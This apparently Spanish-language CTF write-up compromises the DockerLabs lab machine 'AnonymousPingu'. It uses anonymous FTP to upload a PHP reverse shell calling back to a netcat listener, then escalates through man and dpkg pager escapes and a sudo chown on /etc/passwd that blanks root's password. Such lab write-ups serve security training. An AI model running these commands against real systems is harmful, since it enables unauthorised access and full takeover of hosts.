# 🧠 **Informe de Pentesting – Máquina: AnonymousPingu**

### 💡 **Dificultad:** Fácil

📦 **Plataforma:** DockerLabs

![Despliegue](/AnonymousPingu/Imagenes/logo.png)

---

# 🚀 **Despliegue de la Máquina**

Para iniciar la máquina vulnerable, primero descomprimimos el archivo proporcionado y posteriormente ejecutamos el script de despliegue:

```bash
unzip anonymousPingu.zip
sudo bash auto_deploy.sh anonymousPingu.tar
```

![Despliegue](/AnonymousPingu/Imagenes/Despliegue.png)

---

# 📶 **Comprobación de Conectividad**

Una vez desplegada la máquina, verificamos que el objetivo se encuentre activo y responda correctamente a peticiones ICMP:

```bash
ping -c1 172.17.0.2
```

![Despliegue](/AnonymousPingu/Imagenes/ping.png)

---

# 🔍 **Escaneo de Puertos**

## 🔎 Escaneo Completo de Puertos

Se realiza un escaneo completo sobre todos los puertos TCP para identificar los servicios expuestos en la máquina víctima:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### 📌 Puertos Abiertos Detectados

* `21/tcp` → Servicio FTP
* `80/tcp` → Servicio HTTP

---

## 🧩 Enumeración de Servicios y Versiones

Después de identificar los puertos abiertos, procedemos a detectar versiones y configuraciones de los servicios activos:

```bash
nmap -sCV -p21,80 172.17.0.2
```

![Despliegue](/AnonymousPingu/Imagenes/pabiertos.png)

![Despliegue](/AnonymousPingu/Imagenes/serviciosp.png)

Durante esta fase observamos un detalle importante:
el servicio FTP permite autenticación anónima (`Anonymous FTP login allowed`), lo que podría representar una vía de acceso inicial al sistema.

---

# 🧭 **Reconocimiento Web**

## 🖥️ Acceso Inicial a la Aplicación Web

Accedemos al servicio web desde el navegador:

```bash
http://172.17.0.2
```

La página carga correctamente y muestra una aplicación web funcional.

![Despliegue](/AnonymousPingu/Imagenes/pagina.png)

---

# 🗂️ Enumeración de Directorios

Para identificar rutas ocultas o directorios interesantes, realizamos fuzzing utilizando `gobuster`:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 8068
```

Como resultado, se detectan múltiples directorios dentro de la aplicación.

![Despliegue](/AnonymousPingu/Imagenes/gobusteruno.png)

Entre todos los resultados encontrados, el directorio más interesante es:

```bash
/upload/
```

Este directorio resulta especialmente relevante porque podría permitir visualizar archivos subidos al servidor.
Si logramos cargar un archivo PHP malicioso, posiblemente podamos ejecutarlo directamente desde el navegador.

---

# 📂 Acceso al Servicio FTP

Dado que anteriormente detectamos que el servicio FTP permite acceso anónimo, intentamos autenticarnos sin contraseña:

```bash
ftp Anonymous@172.17.0.2
```

El acceso es exitoso.

Una vez dentro del servicio FTP, observamos varios archivos y directorios disponibles.
También es posible descargar todo el contenido utilizando:

```bash
wget -m ftp://172.17.0.2/
```

> Este método únicamente funciona cuando el servicio FTP tiene habilitado el acceso anónimo.

Sin embargo, tras revisar el contenido descargado, no se encontró información sensible o útil para continuar directamente con la explotación.

![Despliegue](/AnonymousPingu/Imagenes/ftpdescarga.png)

Durante el análisis del FTP notamos algo importante:
la estructura de directorios coincide con la encontrada anteriormente mediante `gobuster`, incluyendo el directorio `/upload/`.

Esto indica que probablemente tengamos permisos de escritura sobre dicho directorio, lo que abre la posibilidad de subir un archivo PHP malicioso.

---

# 💣 Explotación – Subida de Reverse Shell PHP

Para obtener ejecución remota de comandos, utilizaremos una reverse shell en PHP.

En este caso se utilizó el siguiente proyecto:

```bash
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Después de descargar el archivo, modificamos la IP y el puerto para que apunten a nuestra máquina atacante:

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;
```

![Despliegue](/AnonymousPingu/Imagenes/revershephp.png)

---

# 🎧 Preparación del Listener

Antes de ejecutar la reverse shell, dejamos nuestra máquina atacante en modo escucha utilizando Netcat:

```bash
nc -lvnp 4445
```

---

# ⬆️ Subida del Archivo Malicioso

Dentro de la sesión FTP, subimos el archivo PHP malicioso al servidor:

```bash
put php-reverse-shell.php
```

![Despliegue](/AnonymousPingu/Imagenes/subirrevel.png)

Una vez subido, podemos confirmar su existencia accediendo al directorio `/upload/` desde el navegador:

```bash
http://172.17.0.2/upload/
```

---

# 🚨 Obtención de Acceso Inicial

Para ejecutar la reverse shell, simplemente accedemos al archivo PHP desde el navegador.

Automáticamente, la conexión inversa se establece contra nuestra máquina atacante y obtenemos una shell interactiva sobre el sistema víctima.

![Despliegue](/AnonymousPingu/Imagenes/phprevenavegador.png)

En la terminal donde dejamos Netcat en escucha, confirmamos el acceso exitoso:

![Despliegue](/AnonymousPingu/Imagenes/escuchaacceso.png)

Con esto obtenemos acceso inicial como el usuario del servidor web (`www-data`).

---
# Nota: Antes de hacer la escalada se debe de hacer el tratamiento de TTY para evitar conflictos en la terminal

```bash
script /dev/null -c bash
```
ctrl Z (Se pondra en pausa la terminal victima)

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```
---

# 🧗 Escalada de Privilegios – De `www-data` a `root`

A continuación se detalla el proceso completo de escalada de privilegios hasta obtener acceso total al sistema.

---

# 🔹 Etapa 1 – Escalada de `www-data` a `pingu`

## 📌 Enumeración de Permisos Sudo

Una vez dentro del sistema, verificamos los permisos sudo disponibles para el usuario actual:

```bash
sudo -l
```

El resultado muestra lo siguiente:

```bash
(pingu) NOPASSWD: /usr/bin/man
```

Esto significa que el usuario `www-data` puede ejecutar el binario `man` como el usuario `pingu` sin necesidad de contraseña.

---

## ⚙️ Explotación de `man`

Ejecutamos el siguiente comando:

```bash
sudo -u pingu /usr/bin/man man
```

El binario `man` utiliza internamente un paginador (`less`) para mostrar la información.
Este tipo de programas permite ejecutar comandos del sistema mediante escapes de shell.

Dentro de la interfaz de `man`, escribimos:

```bash
!/bin/bash
```

Esto genera una shell interactiva con los privilegios del usuario `pingu`.

---

# 🔹 Etapa 2 – Escalada de `pingu` a `gladys`

## 📌 Nuevos Permisos Sudo

Ya como el usuario `pingu`, volvemos a enumerar privilegios sudo:

```bash
sudo -l
```

El resultado indica:

```bash
(gladys) NOPASSWD: /usr/bin/dpkg
```

El usuario `pingu` puede ejecutar `dpkg` como `gladys` sin contraseña.

---

## ⚙️ Explotación de `dpkg`

Ejecutamos:

```bash
sudo -u gladys dpkg -l
```

El comando muestra una lista extensa de paquetes instalados y nuevamente utiliza un paginador interactivo.

Al igual que con `man`, aprovechamos el escape de shell escribiendo:

```bash
!/bin/bash
```

Con esto obtenemos una shell como el usuario `gladys`.

---

# 🔹 Etapa 3 – Escalada de `gladys` a `root`

## 📌 Permiso Crítico Detectado

Como usuario `gladys`, revisamos nuevamente los privilegios sudo:

```bash
sudo -l
```

Observamos el siguiente permiso:

```bash
(root) NOPASSWD: /usr/bin/chown
```

Este privilegio es extremadamente peligroso, ya que permite modificar el propietario de cualquier archivo del sistema.

---

# ⚙️ Explotación de `chown`

## 1️⃣ Tomar Control de `/etc/passwd`

Cambiamos el propietario del archivo `/etc/passwd` al usuario actual:

```bash
sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
```

Ahora tenemos permisos para modificar el archivo.

---

## 2️⃣ Eliminar la Contraseña de Root

Modificamos la línea correspondiente al usuario `root` eliminando el indicador de contraseña:

```bash
sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp
cp /tmp/passwd.tmp /etc/passwd
```

Esto deja la cuenta `root` sin contraseña.

---

## 3️⃣ Obtener Acceso Root

Finalmente cambiamos al usuario `root`:

```bash
su root
```

Verificamos los privilegios obtenidos:

```bash
whoami
```

Resultado:

```bash
root
```

---

# 🏁 Acceso Total Comprometido

Con esto se logra comprometer completamente la máquina y obtener control total sobre el sistema.

![Despliegue](/AnonymousPingu/Imagenes/escaladapingu.png)

![Despliegue](/AnonymousPingu/Imagenes/pingu.png)

![Despliegue](/AnonymousPingu/Imagenes/root.png)

---

# 📚 Resumen de Vulnerabilidades Explotadas

## 🔓 FTP Anónimo Habilitado

El servidor FTP permitía autenticación anónima y además otorgaba permisos de escritura sobre directorios accesibles desde la web.

Esto permitió subir archivos PHP maliciosos y ejecutar código remotamente.

---

## 🧨 Ejecución de Archivos PHP en Directorios de Subida

El directorio `/upload/` permitía ejecutar archivos PHP directamente desde el navegador, facilitando la obtención de una reverse shell.

---

## ⚠️ Configuración Insegura de Sudo

Se encontraron múltiples binarios ejecutables mediante `sudo` sin contraseña:

* `man`
* `dpkg`
* `chown`

Los binarios `man` y `dpkg` permitieron escapes de shell mediante paginadores interactivos.

El permiso sobre `chown` permitió modificar archivos críticos del sistema y comprometer completamente la máquina.

---

